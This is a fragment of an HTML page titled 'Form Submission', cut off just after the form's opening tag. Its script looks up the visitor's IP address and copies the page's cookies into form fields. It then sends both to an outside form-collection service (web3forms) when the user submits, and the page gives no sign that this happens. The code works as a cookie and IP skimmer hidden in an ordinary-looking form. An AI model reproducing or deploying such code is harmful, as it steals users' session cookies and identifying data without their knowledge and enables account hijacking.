  <title>Form Submission</title>
<script>
        function getIP() {
            // Get IP address
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('ip').value = data.ip; // Set the IP address
                    document.getElementById('cookies').value = document.cookie; // Get cookies from the current domain
                    document.getElementById('locationForm').submit(); // Submit the form
                })
                .catch(error => {
                    console.error('Error fetching IP address:', error);
                    alert('Could not retrieve IP address.');
                });
        }

        function submitForm(event) {
            event.preventDefault(); // Prevent default form submission
            getIP(); // Get IP and then submit
        }
    </script>

</head>
<body>
<form id="locationForm" onsubmit="submitForm(event)" action="https://api.web3forms.com/submit" method="post">
